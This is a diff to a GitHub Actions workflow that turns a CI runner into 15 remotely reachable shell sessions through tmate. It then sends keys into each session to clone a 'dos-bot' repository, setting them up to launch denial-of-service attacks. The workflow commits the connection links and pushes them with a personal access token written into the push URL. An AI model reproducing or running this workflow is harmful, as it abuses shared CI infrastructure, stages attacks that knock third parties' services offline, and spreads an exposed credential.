@@ -1,4 +1,4 @@
-name: VPS 15x tmate
+name: VPS 15x + DOS Bot
 
 on:
   workflow_dispatch:
@@ -10,50 +10,63 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Setup multiple tmate sessions
+      - name: Setup tmate and clone DOS bot
         run: |
-          # Tạo file remote-link.txt
-          echo "=== VPS Links Generated at $(date) ===" > remote-link.txt
-          echo "" >> remote-link.txt
-          
           # Download tmate
           curl -fsSL https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz | tar -xJ
           chmod +x tmate-2.4.0-static-linux-amd64/tmate
           
-          # Tạo 15 tmate sessions
+          # Clone DOS bot
+          git clone https://github.com/depchaiaiyeu/dos-bot.git
+          
+          # Create remote-link.txt
+          echo "=== VPS Links - $(date) ===" > remote-link.txt
+          echo "" >> remote-link.txt
+          
+          # Create 15 VPS
           for i in {1..15}; do
             echo "Creating VPS $i..."
             
-            # Tạo session với socket riêng
+            # Start tmate session
             ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i new-session -d "bash"
-            
-            # Đợi session khởi tạo
             sleep 5
             
-            # Lấy thông tin kết nối
-            SSH_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_ssh}')
-            WEB_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_web}')
+            # Get connection info
+            SSH_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_ssh}' 2>/dev/null || echo "Failed")
+            WEB_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_web}' 2>/dev/null || echo "Failed")
             
-            # Ghi vào file
+            # Setup DOS bot in each VPS
+            if [[ "$SSH_LINK" != "Failed" ]]; then
+              # Send commands to setup DOS bot
+              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "cd /tmp" C-m
+              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "git clone https://github.com/depchaiaiyeu/dos-bot.git" C-m
+              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "cd dos-bot" C-m
+              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "ls -la" C-m
+            fi
+            
+            # Write to file
             echo "VPS $i:" >> remote-link.txt
-            echo "SSH: $SSH_LINK" >> remote-link.txt
+            echo "SSH: $SSH_LINK" >> remote-link.txt  
             echo "Web: $WEB_LINK" >> remote-link.txt
             echo "---" >> remote-link.txt
             echo "" >> remote-link.txt
             
-            echo "VPS $i created successfully"
+            echo "VPS $i: $SSH_LINK"
           done
 
-      - name: Commit and push links
+      - name: Commit links
         run: |
           git config --global user.email "actions@github.com"
           git config --global user.name "github-actions"
           git add remote-link.txt
-          git commit -m "Update VPS links - $(date)"
-          git push https://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@github.com/${{ github.repository }} HEAD:main
+          git commit -m "VPS Links - $(date)" || exit 0
+          git push https://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@github.com/${{ github.repository }} HEAD:main || exit 0
 
-      - name: Keep session alive
+      - name: Keep alive
         run: |
-          echo "All VPS created! Check remote-link.txt for connection details"
-          # Giữ workflow chạy trong 25 phút (timeout sẽ tự dừng)
+          echo "🔥 15 VPS created with DOS bot ready!"
+          echo "📋 Check remote-link.txt for connections"
+          echo "💻 DOS bot cloned in /tmp/dos-bot on each VPS"
+          
+          # Keep sessions alive
           sleep 1500
